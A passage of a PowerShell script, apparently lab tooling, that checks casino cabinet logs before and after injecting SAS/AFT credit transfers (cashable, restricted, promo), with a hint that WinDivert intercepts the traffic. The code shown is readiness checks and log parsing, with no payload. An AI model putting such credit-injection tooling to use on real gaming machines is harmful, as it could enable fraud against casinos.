        'aft_exception_69' {
            $detail.Summary = 'Stale AFT exception 69 / pending transaction is blocking WAT2AFT; clear or AutoWake before inject.'
        }
        'aft_busy' {
            $detail.Summary = 'An AFT transaction is already in progress; wait for ALL WAT TRANSACTIONS FINISHED.'
        }
        default {
            if ($detail.LastWat2AftUp) {
                $detail.Category = 'wat2aft_stale'
                $detail.Summary = 'WAT2AFT UP exists in the log but is older than this warmup window (service may have recycled).'
            }
            elseif (-not $detail.SasPollLine) {
                $detail.Category = 'no_sas_polls'
                $detail.Summary = @(
                    'No recent qGMID1:80/81 general polls in sasmsgr log.',
                    'Without steady SAS polls the EGM stays offline and WAT2AFT UP may never appear.'
                ) -join ' '
            }
            else {
                $detail.Summary = 'WAT2AFT UP line never appeared in the Aurum log during warmup (service not ready for AFT commit).'
            }
        }
    }

    return $detail
}

function Write-Wat2AftWarmupFailureHelp {
    param(
        [string] $Computer,
        [string] $Context,
        [Nullable[datetime]] $SinceUtc = $null
    )
    $detail = Get-Wat2AftWarmupFailureDetail -Computer $Computer -SinceUtc $SinceUtc
    Write-Host ''
    Write-Host "[!] Aborting inject ($Context): WAT2AFT UP not confirmed." -ForegroundColor Red
    Write-Host "    $($detail.Summary)" -ForegroundColor Yellow
    if ($detail.LastWat2AftUp) {
        Write-Host "    Last WAT2AFT UP (outside warmup window): $($detail.LastWat2AftUp)" -ForegroundColor DarkGray
    }
    foreach ($ev in $detail.Evidence) {
        Write-Host "    Evidence: $ev" -ForegroundColor DarkGray
    }
    if ($detail.SasPollLine) {
        Write-Host "    Latest SAS poll: $($detail.SasPollLine)" -ForegroundColor DarkGray
    }
    else {
        Write-Host '    Latest SAS poll: none in sasmsgr log tail (qGMID1:80/81 missing).' -ForegroundColor DarkGray
        if ($detail.SasmsgrLogPath) {
            Write-Host "    Checked: $($detail.SasmsgrLogPath)" -ForegroundColor DarkGray
        }
    }
    $bridge = Get-CommCtrlSasBridgeDetail -Computer $Computer
    if ($bridge.Port40000Only) {
        Write-Host '    CommCtrlSAS stuck at port 40000 - MUX serial bridge never started (no 31150/30550).' -ForegroundColor Yellow
        if (-not $bridge.Com5Open) {
            Write-Host '    Roulette tip: COM5 (MUX @921600) missing -> cold boot / restore USB serial; service wake alone often stays on :40000.' -ForegroundColor Yellow
        }
        if ($bridge.MuxIdentity) {
            Write-Host "    MUX identity: $($bridge.MuxIdentity)" -ForegroundColor DarkGray
        }
        if ($Computer -eq '10.0.0.171') {
            Write-Host '    Compare MUX: .90 reports SI-1.0.3, .171 reports SI-2.0.1 (see aft/investigations/mux-firmware.md).' -ForegroundColor DarkGray
            Write-Host '    Fix: restore COM11 bring-up (MUX swap test from .90, or MUX wiring), then retry WinDivert pollaft.' -ForegroundColor DarkGray
            Write-Host '    See aft/investigations/171-landing-plan.md' -ForegroundColor DarkGray
        }
    }
    elseif ($Computer -eq '10.0.0.171') {
        Write-Host '    Cabinet 10.0.0.171: ensure CommCtrlSAS bridge 31150 is ESTABLISHED before inject.' -ForegroundColor DarkGray
        Write-Host '    See aft/investigations/171-landing-plan.md' -ForegroundColor DarkGray
    }
    Write-Host "    Aurum log: $($detail.AurumLogPath)" -ForegroundColor DarkGray
    Write-Host '    Retry after: bridge online + mapped=true + WAT2AFT UP in Aurum log, or run with -NoAutoWake / -SkipAurumReadyWait only if you accept the risk.' -ForegroundColor DarkGray
}

function Test-SasMessengerIngested {
    # Returns the matching qGMID1 line (timestamp >= SinceUtc) or $null.
    # Must match the FULL SAS packet hex (txn id + CRC are unique per run).
    param(
        [string] $Computer,
        [string] $PacketHex,
        [datetime] $SinceUtc
    )
    $logPath = Get-SasmsgrLogPath -Computer $Computer
    if (-not (Test-Path -LiteralPath $logPath)) { return $null }

    $needle = $PacketHex.ToUpperInvariant()
    $sinceCab = Convert-WorkstationUtcToCabinetLogUtc -LogPath $logPath -Utc $SinceUtc -Computer $Computer
    # Tail-scan only: the injected line is the newest qGMID1 entry, so reading the tail
    # (instead of the multi-MB full-day log) keeps repeated polling fast and light.
    $hits = Get-Content -LiteralPath $logPath -Tail 800 -ErrorAction SilentlyContinue | Select-String -Pattern 'qGMID1:0172'
    foreach ($hit in @($hits)) {
        $line = $hit.Line
        if (-not (Test-LogLineAfter -Line $line -SinceUtc $sinceCab)) { continue }
        if ($line.ToUpperInvariant().Contains($needle)) {
            return $line
        }
    }
    return $null
}

function Find-CreditEvidence {
    param(
        [string] $Computer,
        [datetime] $StartUtc,
        [datetime] $EndUtc,
        [int64]  $Amount,
        [string] $TransferType
    )
    $results = New-Object System.Collections.Generic.List[string]
    $amountDollars = [string]::Format([Globalization.CultureInfo]::GetCultureInfo('en-US'), '${0:N2}', ([double]$Amount / 100.0))
    $amountDollarsPattern = [regex]::Escape($amountDollars)
    $amountRawPattern = [regex]::Escape([string]$Amount)
    $fieldPattern = switch ($TransferType) {
        'cashable'       { 'cashable' }
        'restricted'     { 'restricted' }
        default          { 'promo|non-?restricted' }
    }
    $slotLogPattern = switch ($TransferType) {
        'cashable'       { "Cashless In: ${amountDollarsPattern}|cashable credit state increased to ${amountRawPattern}" }
        'restricted'     { "Cashless In: ${amountDollarsPattern}|restricted credit state increased to ${amountRawPattern}" }
        default          { "Cashless In: ${amountDollarsPattern}|promo credit state increased to ${amountRawPattern}" }
    }
    $subFolders = @(
        @{ Folder = 'OneHand GM2AU'; Pattern = "Withdraw successful GCC_ST_\d+_01 .*${amountRawPattern}.*(${fieldPattern}|promo)" },
        @{ Folder = 'ruleta GM2AU'; Pattern = "Withdraw successful GCC_RT_[^ ]+ .*${amountRawPattern}|Withdraw successful.*${amountRawPattern}" },
        @{ Folder = 'OneHand TRANSACTION EVENTS'; Pattern = "Transfer IN .*${amountDollarsPattern}.*(${fieldPattern}|promo)" },
        @{ Folder = 'SlotLog'; Pattern = $slotLogPattern },
        @{ Folder = 'ruleta'; Pattern = "RCM .*c=\s*${amountRawPattern}|Cashless|promo credit|Transfer IN" }
    )
    $aurumFinishedPattern = switch ($TransferType) {
        'cashable'   { "TRANSFER REQUEST FROM SERVER FINISHED.*FULL_TRANSFER_SUCCESSFUL.*Cashable Com\(${amountRawPattern}\)" }
        'restricted' { "TRANSFER REQUEST FROM SERVER FINISHED.*FULL_TRANSFER_SUCCESSFUL.*Restricted Com\(${amountRawPattern}\)" }
        default      { "TRANSFER REQUEST FROM SERVER FINISHED.*FULL_TRANSFER_SUCCESSFUL.*NonRestricted Com\(${amountRawPattern}\)" }
    }
    $subFolders += @{ Folder = 'GoldClub.Aurum.Services'; Pattern = $aurumFinishedPattern }
    foreach ($sf in $subFolders) {
        $logPath = Get-DatedLogPath -Computer $Computer -SubFolder $sf.Folder -Date (Get-Date)
        if (-not (Test-Path -LiteralPath $logPath)) { continue }
        $hits = Get-Content -LiteralPath $logPath -Tail 1500 -ErrorAction SilentlyContinue | Select-String -Pattern $sf.Pattern
        foreach ($hit in @($hits)) {
            $line = $hit.Line
            if (Test-LogLineBetween -Line $line -StartUtc $StartUtc -EndUtc $EndUtc) {
                $results.Add(("[{0}] {1}" -f $sf.Folder, $line.Trim()))
            }
        }
    }
    return ,[string[]]($results.ToArray())
}

function Find-AftFailureEvidence {
    param(
        [string]   $Computer,
        [datetime] $StartUtc,
        [datetime] $EndUtc,
        [int]      $TxnNumber
    )
    $results = New-Object System.Collections.Generic.List[string]
    $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
    if (-not (Test-Path -LiteralPath $logPath)) { return $results }

    $txnToken = "Transaction$TxnNumber"
    $patterns = @(
        'CASHOUT BUTTON PRESSED',
        'AFT EXCEPTION ISSUED',
        'AFT PRIORITY EXCEPTION',
        'TRANSACTION CURRENTLY IN PROGRESS',
        'AFT exception 69',
        'TRANSFER AMOUNTS MISMATCH',
        'TRANSACTION ID IS THE SAME AS IN MOST RECENT TRANSACTION',
        'TRANSFER REQUEST FROM SERVER FINISHED.*UNEXPECTED_ERROR',
        "TRANSFER REQUEST FROM SERVER FINISHED.*$txnToken",
        "TRANSFER REQUEST FROM SERVER STARTED.*$txnToken"
    )
    foreach ($line in (Get-Content -LiteralPath $logPath -Tail 2500 -ErrorAction SilentlyContinue)) {
        if (-not (Test-LogLineBetween -Line $line -StartUtc $StartUtc -EndUtc $EndUtc)) { continue }
        foreach ($pat in $patterns) {
            if ($line -match $pat) {
                $results.Add($line.Trim())
                break
            }
        }
    }
    return $results
}

function Test-CabinetSasPollsRecent {
    param(
        [string] $Computer,
        [int]    $WithinSeconds = 15,
        $SinceUtc = $null
    )
    $logPath = Get-SasmsgrLogPath -Computer $Computer
    if (-not (Test-Path -LiteralPath $logPath)) { return $false }
    $cutoffSrc = if ($null -ne $SinceUtc) { [datetime]$SinceUtc } else { (Get-Date).ToUniversalTime().AddSeconds(-[math]::Abs($WithinSeconds)) }
    $cutoff = Convert-WorkstationUtcToCabinetLogUtc -LogPath $logPath -Utc $cutoffSrc -Computer $Computer
    foreach ($line in (Get-Content -LiteralPath $logPath -Tail 80 -ErrorAction SilentlyContinue)) {
        if ($line -notmatch 'qGMID1:8[01]\s*$') { continue }
        if ($line -notmatch '^(\S+)') { continue }
        try {
            $lineUtc = Get-LogLineUtc $Matches[1]
        }
        catch {
            continue
        }
        if ($lineUtc -ge $cutoff) { return $true }
    }
    return $false
}

function Test-AurumWakeableBlocker {
    param([hashtable] $State)
    if ($State.Ready) { return $false }
    # Only wake for sticky pending-transfer states. Exception 66 (cashout) and
    # PRIORITY EXCEPTION during a normal transfer must not restart the bridge
    # (that kills a live IGT tester session on the MUX).
    $needles = @(
        'exception 69',
        'PENDING TRANSACTION',
        'IN PROGRESS',
        'transfer in flight'
    )
    $haystack = "$($State.Reason) $($State.LastLine)".ToLowerInvariant()
    foreach ($n in $needles) {
        if ($haystack -match [regex]::Escape($n.ToLowerInvariant())) { return $true }
    }
    return $false
}

function Get-AurumAftFsmState {
    param(
        [string]   $Computer,
        [int]      $TailLines = 800,
        [int]      $RecentSec = 180,
        [Nullable[datetime]] $SinceUtc = $null
    )
    $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
    if (-not (Test-Path -LiteralPath $logPath)) {
        return @{ Ready = $false; Reason = 'Aurum log missing  -  cannot confirm idle'; LastLine = $null; SoftOnly = $false }
    }

    # Validated on roulette .90 (2026-07-20): IGT tester landed cashable AFT while
    # "AFT EXCEPTION ISSUED: 66" (cashout) was still the newest exception line.
    # 66 is NOT a pending host->EGM transfer; do not treat it as a hard blocker.
    $utcNow = (Get-Date).ToUniversalTime()
    $cutoffSrc = if ($null -ne $SinceUtc) { [datetime]$SinceUtc } else { $utcNow.AddSeconds(-[math]::Abs($RecentSec)) }
    $cutoffUtc = Convert-WorkstationUtcToCabinetLogUtc -LogPath $logPath -Utc $cutoffSrc -Computer $Computer

    $lastHard = $null
    $lastClear = $null
    $lastStarted = $null
    $lastSoft = $null
    $futureSkewCount = 0
    $parsedCount = 0

    foreach ($line in (Get-Content -LiteralPath $logPath -Tail $TailLines -ErrorAction SilentlyContinue)) {
        if ($line -notmatch '^(\S+)') { continue }
        try {
            $lineUtc = Get-LogLineUtc $Matches[1]
        }
        catch {
            continue
        }
        $parsedCount++
        # Cabinet clock often differs from the workstation. Future-dated lines are
        # still processed (they are "recent" on the cabinet). Only apply RecentSec
        # cutoff to timestamps that are clearly in the past.
        if ($lineUtc -gt $utcNow.AddMinutes(5)) {
            $futureSkewCount++
        }
        elseif ($lineUtc -lt $cutoffUtc) {
            continue
        }

        $trim = $line.Trim()

        if ($trim -match 'CASHOUT BUTTON PRESSED' -or $trim -match 'AFT EXCEPTION ISSUED:\s*66\b') {
            if ($null -eq $lastSoft -or $lineUtc -gt $lastSoft.Utc) {
                $lastSoft = @{ Utc = $lineUtc; Line = $trim; Pattern = 'exception 66 / cashout (ignored)' }
            }
            continue
        }

        if ($trim -match 'ALL WAT TRANSACTIONS FINISHED' `
                -or $trim -match 'TRANSFER REQUEST FROM SERVER FINISHED' `
                -or $trim -match 'FULL_TRANSFER_SUCCESSFUL' `
                -or $trim -match 'AFT LOCK CANCELLED') {
            if ($null -eq $lastClear -or $lineUtc -gt $lastClear.Utc) {
                $lastClear = @{ Utc = $lineUtc; Line = $trim }
            }
        }

        if ($trim -match 'TRANSFER REQUEST FROM SERVER STARTED') {
            if ($null -eq $lastStarted -or $lineUtc -gt $lastStarted.Utc) {
                $lastStarted = @{ Utc = $lineUtc; Line = $trim; Pattern = 'transfer in flight' }
            }
        }

        $hardPat = $null
        if ($trim -match 'TRANSACTION CURRENTLY IN PROGRESS') { $hardPat = 'TRANSACTION CURRENTLY IN PROGRESS' }
        elseif ($trim -match 'A PENDING TRANSACTION FOUND') { $hardPat = 'A PENDING TRANSACTION FOUND' }
        elseif ($trim -match 'AFT exception 69\b') { $hardPat = 'AFT exception 69' }
        elseif ($trim -match 'AFT EXCEPTION ISSUED:\s*69\b') { $hardPat = 'AFT EXCEPTION ISSUED: 69' }
        elseif ($trim -match 'AFT EXCEPTION ISSUED:\s*(\d+)') {
            # Unknown sticky codes (not 66) — keep as hard until cleared.
            $hardPat = "AFT EXCEPTION ISSUED: $($Matches[1])"
        }
        # PRIORITY EXCEPTION alone is normal mid-transfer noise (seen with FULL_TRANSFER_SUCCESSFUL).

        if ($hardPat) {
            if ($null -eq $lastHard -or $lineUtc -gt $lastHard.Utc) {
                $lastHard = @{ Utc = $lineUtc; Line = $trim; Pattern = $hardPat }
            }
        }
    }

    # Clock-skew fallback: re-scan tail with relative ordering only (no cutoff).
    if ($parsedCount -gt 0 -and $futureSkewCount -ge [math]::Max(3, [int]($parsedCount * 0.5))) {
        $lastHard = $null; $lastClear = $null; $lastStarted = $null; $lastSoft = $null
        $seq = 0
        foreach ($line in (Get-Content -LiteralPath $logPath -Tail $TailLines -ErrorAction SilentlyContinue)) {
            $seq++
            $trim = $line.Trim()
            if ($trim -match 'CASHOUT BUTTON PRESSED' -or $trim -match 'AFT EXCEPTION ISSUED:\s*66\b') {
                $lastSoft = @{ Utc = $seq; Line = $trim; Pattern = 'exception 66 / cashout (ignored)' }
                continue
            }
            if ($trim -match 'ALL WAT TRANSACTIONS FINISHED' `
                    -or $trim -match 'TRANSFER REQUEST FROM SERVER FINISHED' `
                    -or $trim -match 'FULL_TRANSFER_SUCCESSFUL' `
                    -or $trim -match 'AFT LOCK CANCELLED') {
                $lastClear = @{ Utc = $seq; Line = $trim }
            }
            if ($trim -match 'TRANSFER REQUEST FROM SERVER STARTED') {
                $lastStarted = @{ Utc = $seq; Line = $trim; Pattern = 'transfer in flight' }
            }
            $hardPat = $null
            if ($trim -match 'TRANSACTION CURRENTLY IN PROGRESS') { $hardPat = 'TRANSACTION CURRENTLY IN PROGRESS' }
            elseif ($trim -match 'A PENDING TRANSACTION FOUND') { $hardPat = 'A PENDING TRANSACTION FOUND' }
            elseif ($trim -match 'AFT exception 69\b') { $hardPat = 'AFT exception 69' }
            elseif ($trim -match 'AFT EXCEPTION ISSUED:\s*69\b') { $hardPat = 'AFT EXCEPTION ISSUED: 69' }
            elseif ($trim -match 'AFT EXCEPTION ISSUED:\s*(\d+)' -and $trim -notmatch 'AFT EXCEPTION ISSUED:\s*66\b') {
                $hardPat = "AFT EXCEPTION ISSUED: $($Matches[1])"
            }
            if ($hardPat) {
                $lastHard = @{ Utc = $seq; Line = $trim; Pattern = $hardPat }
            }
        }
    }

    if ($lastStarted -and ($null -eq $lastClear -or $lastStarted.Utc -gt $lastClear.Utc)) {
        return @{
            Ready    = $false
            Reason   = 'Recent Aurum blocker (transfer in flight)'
            LastLine = $lastStarted.Line
            SoftOnly = $false
        }
    }
    if ($lastHard -and ($null -eq $lastClear -or $lastHard.Utc -gt $lastClear.Utc)) {
        return @{
            Ready    = $false
            Reason   = "Recent Aurum blocker ($($lastHard.Pattern))"
            LastLine = $lastHard.Line
            SoftOnly = $false
        }
    }
    if ($lastClear) {
        return @{
            Ready    = $true
            Reason   = 'Aurum AFT idle (clear/finish seen)'
            LastLine = $lastClear.Line
            SoftOnly = $false
        }
    }
    if ($lastSoft) {
        return @{
            Ready    = $true
            Reason   = 'No hard AFT blocker (ignored cashout/exception 66)'
            LastLine = $lastSoft.Line
            SoftOnly = $true
        }
    }
    return @{ Ready = $true; Reason = 'No recent AFT activity'; LastLine = $null; SoftOnly = $false }
}

function Wait-AurumAftReady {
    param(
        [string]   $Computer,
        [int]      $TimeoutSec = 120,
        [int]      $PollSec = 4,
        [Nullable[datetime]] $SinceUtc = $null,
        [switch]   $AutoWakeOnBlocker,
        [ref]      $AutoWakeDoneRef,
        [ref]      $WakeSinceUtcRef,
        [scriptblock] $AutoWakeAction
    )
    $deadline = (Get-Date).AddSeconds([math]::Max(1, $TimeoutSec))
    $wakeAttemptedInWait = $false
    do {
        $state = Get-AurumAftFsmState -Computer $Computer -SinceUtc $SinceUtc
        if ($state.Ready) {
            return $state
        }
        if ($AutoWakeOnBlocker -and $AutoWakeAction -and -not $wakeAttemptedInWait) {
            $alreadyDone = $AutoWakeDoneRef -and $AutoWakeDoneRef.Value
            if (-not $alreadyDone -and (Test-AurumWakeableBlocker -State $state)) {
                Write-Host '[*] Wakeable Aurum blocker detected  -  AutoWake now (not waiting full timeout)...' -ForegroundColor Cyan
                if ($state.LastLine) {
                    Write-Host "    $($state.LastLine)" -ForegroundColor DarkGray
                }
                & $AutoWakeAction
                $wakeAttemptedInWait = $true
                if ($AutoWakeDoneRef) { $AutoWakeDoneRef.Value = $true }
                if ($WakeSinceUtcRef) { $WakeSinceUtcRef.Value = (Get-Date).ToUniversalTime() }
                $SinceUtc = if ($WakeSinceUtcRef) { $WakeSinceUtcRef.Value } else { (Get-Date).ToUniversalTime() }
                continue
            }
        }
        Write-Host "[*] Aurum not ready: $($state.Reason)" -ForegroundColor Yellow
        if ($state.LastLine) {
            Write-Host "    $($state.LastLine)" -ForegroundColor DarkGray
        }
        Start-Sleep -Seconds ([math]::Max(1, $PollSec))
    } while ((Get-Date) -lt $deadline)
    return (Get-AurumAftFsmState -Computer $Computer -SinceUtc $SinceUtc)
}

function Test-AurumWat2AftRecent {
    param(
        [string] $Computer,
        [int]    $WithinSeconds = 120
    )
    $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
    if (-not (Test-Path -LiteralPath $logPath)) { return $false }
    $cutoffUtc = Convert-WorkstationUtcToCabinetLogUtc -LogPath $logPath -Utc ((Get-Date).ToUniversalTime().AddSeconds(-[math]::Abs($WithinSeconds))) -Computer $Computer
    foreach ($line in (Get-Content -LiteralPath $logPath -Tail 120 -ErrorAction SilentlyContinue)) {
        if ($line -notmatch 'WAT2AFT UP') { continue }
        if ($line -notmatch '^(\S+)') { continue }
        try { $lineUtc = Get-LogLineUtc $Matches[1] } catch { continue }
        if ($lineUtc -ge $cutoffUtc) { return $true }
    }
    return $false
}

function Confirm-AurumInjectReady {
    param(
        [string]   $Computer,
        [int]      $WatTimeoutSec = 30,
        [int]      $MappingTimeoutSec = 45,
        [int]      $SettleSec = 8,
        [Nullable[datetime]] $SinceUtc = $null,
        [string]   $Context = 'preflight',
        [switch]   $AllowAutoWakeRetry,
        [scriptblock] $AutoWakeAction = $null,
        [ref]      $AutoWakeDoneRef,
        [ref]      $WakeSinceUtcRef
    )

    $tryAutoWakeRecycle = {
        param([string] $Reason)
        $alreadyDone = $AutoWakeDoneRef -and $AutoWakeDoneRef.Value
        if (-not ($AllowAutoWakeRetry -and $AutoWakeAction -and -not $alreadyDone)) {
            return $null
        }
        Write-Host ("[*] {0} ({1}) - AutoWake bridge recycle, then retry WAT2AFT + mapping..." -f $Reason, $Context) -ForegroundColor Cyan
        & $AutoWakeAction $null
        if ($AutoWakeDoneRef) { $AutoWakeDoneRef.Value = $true }
        $wakeUtc = (Get-Date).ToUniversalTime()
        if ($WakeSinceUtcRef) { $WakeSinceUtcRef.Value = $wakeUtc }
        return $wakeUtc
    }

    $watSince = $SinceUtc
    $watOk = Wait-AurumWat2AftWarmup -Computer $Computer -TimeoutSec $WatTimeoutSec -SinceUtc $watSince
    if (-not $watOk) {
        $wakeUtc = & $tryAutoWakeRecycle 'WAT2AFT UP not seen within warmup window'
        if ($wakeUtc) {
            $watSince = $wakeUtc
            $watOk = Wait-AurumWat2AftWarmup -Computer $Computer -TimeoutSec 90 -SinceUtc $watSince
        }
        if (-not $watOk) {
            Write-Wat2AftWarmupFailureHelp -Computer $Computer -Context $Context -SinceUtc $watSince
            exit 5
        }
        Write-Host '[+] WAT2AFT UP confirmed (after AutoWake).' -ForegroundColor Green
    }
    else {
        Write-Host '[+] WAT2AFT UP confirmed.' -ForegroundColor Green
    }

    $mappingSince = if ($watSince) { $watSince } else { $SinceUtc }
    if (-not (Wait-AurumMappingReady -Computer $Computer -TimeoutSec $MappingTimeoutSec -SinceUtc $mappingSince)) {
        $wakeUtc = & $tryAutoWakeRecycle 'Aurum mapping not stable (mapped=false)'
        if ($wakeUtc) {
            $mappingSince = $wakeUtc
            if (-not (Wait-AurumWat2AftWarmup -Computer $Computer -TimeoutSec 90 -SinceUtc $mappingSince)) {
                Write-Wat2AftWarmupFailureHelp -Computer $Computer -Context "$Context after AutoWake" -SinceUtc $mappingSince
                exit 5
            }
            Write-Host '[+] WAT2AFT UP confirmed (post-mapping AutoWake).' -ForegroundColor Green
            if (-not (Wait-AurumMappingReady -Computer $Computer -TimeoutSec 45 -SinceUtc $mappingSince)) {
                Write-Host "[!] Aborting inject ($Context): Aurum mapping still not stable after AutoWake." -ForegroundColor Red
                exit 5
            }
        }
        else {
            Write-Host "[!] Aborting inject ($Context): Aurum mapping not stable (txn85/86 ingest-without-credit pattern)." -ForegroundColor Red
            exit 5
        }
    }
    Write-Host '[+] Aurum mapping stable (mapped=true).' -ForegroundColor Green
    if ($SettleSec -gt 0) {
        Write-Host ('[*] Pre-inject settle: {0}s after mapping ready...' -f $SettleSec) -ForegroundColor DarkGray
        Start-Sleep -Seconds $SettleSec
    }
}

function Wait-AurumWat2AftWarmup {
    param(
        [string] $Computer,
        [int]    $TimeoutSec = 20,
        [Nullable[datetime]] $SinceUtc = $null
    )
    $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
    $deadline = (Get-Date).AddSeconds([math]::Max(1, $TimeoutSec))
    do {
        if (-not (Test-Path -LiteralPath $logPath)) {
            $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
        }
        if (Test-Path -LiteralPath $logPath) {
            $sinceCab = if ($null -ne $SinceUtc) {
                Convert-WorkstationUtcToCabinetLogUtc -LogPath $logPath -Utc ([datetime]$SinceUtc) -Computer $Computer
            } else { $null }
            foreach ($line in (Get-Content -LiteralPath $logPath -Tail 200 -ErrorAction SilentlyContinue)) {
                if ($line -notmatch 'WAT2AFT UP') { continue }
                if ($line -notmatch '^(\S+)') { continue }
                try { $lineUtc = Get-LogLineUtc $Matches[1] } catch { continue }
                if ($null -ne $sinceCab -and $lineUtc -lt $sinceCab) { continue }
                return $true
            }
        }
        Start-Sleep -Seconds 2
    } while ((Get-Date) -lt $deadline)
    return $false
}

function Wait-AurumMappingReady {
    param(
        [string]   $Computer,
        [int]      $TimeoutSec = 30,
        [Nullable[datetime]] $SinceUtc = $null
    )
    $logPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
    if (-not (Test-Path -LiteralPath $logPath)) { return $false }
    # Allow mapped=true a few seconds before WAT2AFT UP (roulette often logs map then UP).
    $cutoffSrc = if ($null -ne $SinceUtc) {
        ([datetime]$SinceUtc).AddSeconds(-30)
    } else {
        (Get-Date).ToUniversalTime().AddMinutes(-5)
    }
    $cutoffUtc = Convert-WorkstationUtcToCabinetLogUtc -LogPath $logPath -Utc $cutoffSrc -Computer $Computer
    $deadline = (Get-Date).AddSeconds([math]::Max(1, $TimeoutSec))
    do {
        # Last Mapping:/SetMapped: state in a wider tail wins (stable map stops reprinting).
        $lastState = $null
        foreach ($line in (Get-Content -LiteralPath $logPath -Tail 200 -ErrorAction SilentlyContinue)) {
            if ($line -notmatch '^(\S+).*(?:Mapping: mapped = |SetMapped: mapped = )(true|false|True|False)') { continue }
            try { $lineUtc = Get-LogLineUtc $Matches[1] } catch { continue }
            if ($lineUtc -lt $cutoffUtc) { continue }
            $lastState = ($Matches[2] -match '^(true|True)$')
        }
        if ($lastState -eq $true) { return $true }
        Start-Sleep -Seconds 2
    } while ((Get-Date) -lt $deadline)
    return $false
}

function Get-CabinetLatestPollLine {
    param(
        [string] $Computer,
        [string] $Pattern = 'qGMID1:8[01]\s*$'
    )
    $logPath = Get-SasmsgrLogPath -Computer $Computer
    if (-not (Test-Path -LiteralPath $logPath)) { return $null }
    $hits = Get-Content -LiteralPath $logPath -Tail 120 -ErrorAction SilentlyContinue | Select-String -Pattern $Pattern
    if (-not $hits) { return $null }
    return ($hits | Select-Object -Last 1).Line.Trim()
}

function Test-CabinetPrefersMuxComPolls {
    param([string] $Computer)
    return $false
}

function Get-CommCtrlSasBridgeDetail {
    param([string] $Computer)
    $logPaths = @(
        (Get-DatedLogPath -Computer $Computer -SubFolder 'CommCtrlSAS' -Date (Get-Date)),
        (Get-DatedLogPath -Computer $Computer -SubFolder 'CommCtrl' -Date (Get-Date))
    )
    $detail = [ordered]@{
        LogPath       = $null
        MuxIdentity   = $null
        Com11Open     = $false
        Com5Open      = $false
        Bridge31150   = $false
        Bridge30550   = $false
        Port40000Only = $false
        LastLines     = @()
    }
    $allLines = @()
    foreach ($logPath in $logPaths) {
        if (-not (Test-Path -LiteralPath $logPath)) { continue }
        if (-not $detail.LogPath) { $detail.LogPath = $logPath }
        $allLines += @(Get-Content -LiteralPath $logPath -Tail 80 -ErrorAction SilentlyContinue)
    }
    $detail.LastLines = $allLines | Select-Object -Last 40
    foreach ($line in $allLines) {
        if ($line -match 'CheckForMux Detected:\s*(.+)$') {
            $detail.MuxIdentity = $Matches[1].Trim()
        }
        if ($line -match 'serial port \\\.\\COM11 open') { $detail.Com11Open = $true }
        if ($line -match 'serial port \\\.\\COM5 open') { $detail.Com5Open = $true }
        if ($line -match 'Listening on port 31150|established on port 31150') { $detail.Bridge31150 = $true }
        if ($line -match 'Listening on port 30550|established on port 30550') { $detail.Bridge30550 = $true }
    }
    $has40000 = [bool]($allLines -match 'Listening on port 40000')
    if ($has40000 -and -not $detail.Bridge31150 -and -not $detail.Bridge30550) {
        $detail.Port40000Only = $true
    }
    return $detail
}

function Test-CabinetIsRoulette {
    param([string] $Computer)
    foreach ($p in @(
        ('\\{0}\c$\goldclub\ruleta\ruleta.exe' -f $Computer),
        ('\\{0}\c$\Goldclub\ruleta\ruleta.exe' -f $Computer),
        ('\\{0}\c$\Goldclub\var\log\ruleta' -f $Computer)
    )) {
        if (Test-Path -LiteralPath $p) { return $true }
    }
    return $false
}

function Resolve-CabinetProfile {
    param(
        [string] $Computer,
        [ValidateSet('Auto', 'Slot', 'Roulette')]
        [string] $Requested = 'Auto'
    )
    if ($Requested -ne 'Auto') { return $Requested }
    if (Test-CabinetIsRoulette -Computer $Computer) { return 'Roulette' }
    return 'Slot'
}

function Get-ClientsSetSasChannel {
    <#
    Read Aurum SASControler1\ClientsSet.xml for the live SAS address + bridge ports.
    Roulette lab (.90): SASAddress=1, Port=30500, WakeUpPort=30550.
    #>
    param([string] $Computer)
    $result = [ordered]@{
        Path          = $null
        SasAddress    = 0
        Port          = 0
        WakeUpPort    = 0
        AurumEgmId    = $null
        Ok            = $false
        Detail        = ''
    }
    $candidates = @(
        ('\\{0}\c$\goldclub\services\aurum\config\SASControler1\ClientsSet.xml' -f $Computer),
        ('\\{0}\c$\Goldclub\services\aurum\config\SASControler1\ClientsSet.xml' -f $Computer)
    )
    $path = $candidates | Where-Object { Test-Path -LiteralPath $_ } | Select-Object -First 1
    if (-not $path) {
        $result.Detail = 'ClientsSet.xml not found'
        return [pscustomobject]$result
    }
    $result.Path = $path
    try {
        [xml]$xml = Get-Content -LiteralPath $path -Raw
        $client = $xml.ClientsSet.Clients.SASClientState
        if (-not $client) { throw 'No SASClientState node' }
        $addr = 0
        [void][int]::TryParse([string]$client.SASAddress, [ref]$addr)
        $port = 0
        [void][int]::TryParse([string]$client.Port, [ref]$port)
        $wake = 0
        [void][int]::TryParse([string]$client.WakeUpPort, [ref]$wake)
        $result.SasAddress = $addr
        $result.Port = $port
        $result.WakeUpPort = $wake
        $result.AurumEgmId = [string]$client.AurumEgmId
        $result.Ok = ($addr -ge 1 -and $addr -le 127)
        $result.Detail = "SASAddress=$addr Port=$port WakeUpPort=$wake EgmId=$($result.AurumEgmId)"
    }
    catch {
        $result.Detail = "ClientsSet parse failed: $($_.Exception.Message)"
    }
    return [pscustomobject]$result
}

function Resolve-LiveSasBridgePort {
    <#
    Probe ESTABLISHED CommCtrlSAS<->Aurum TCP ports. Slot uses 31150; roulette MUX path uses 30550.
    #>
    param(
        [string] $Computer,
        [int[]]  $PreferredPorts,
        [pscredential] $Credential
    )
    $ports = @($PreferredPorts | Where-Object { $_ -gt 0 } | Select-Object -Unique)
    if ($ports.Count -eq 0) { $ports = @(31150, 30550) }

    $result = [ordered]@{
        Port          = 0
        Established   = @()
        Listening     = @()
        Port40000Only = $false
        Detail        = ''
    }

    $probeScript = {
        param([int[]] $Want)
        $est = @()
        $listen = @()
        foreach ($p in $Want) {
            $e = @(Get-NetTCPConnection -LocalPort $p -State Established -ErrorAction SilentlyContinue)
            if ($e.Count -gt 0) { $est += $p }
